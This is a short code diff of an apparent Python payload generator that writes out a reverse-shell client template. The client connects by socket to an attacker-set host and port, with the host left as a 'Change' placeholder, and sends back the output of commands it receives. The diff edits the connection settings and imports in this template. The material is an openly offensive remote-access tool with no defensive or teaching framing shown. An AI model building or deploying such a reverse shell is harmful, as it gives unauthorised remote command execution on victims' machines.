@@ -53,10 +53,11 @@ arq = open(file_name, 'w')
 temp = """
 import socket
 import subprocess
+import os
+import sys
 
-
-REMOTE_HOST = '127.0.0.1' 
-REMOTE_PORT = 8081 
+REMOTE_HOST = '' # Change
+REMOTE_PORT = 8080
 client = socket.socket()
 print("[-] Connection Initiating...")
 client.connect((REMOTE_HOST, REMOTE_PORT))
@@ -72,6 +73,7 @@ while True:
     print("[-] Sending response...")
     client.send(output + output_error)
 """
+
 print ("[*] Generating...")
 os.system("clear")
 print ("1%")
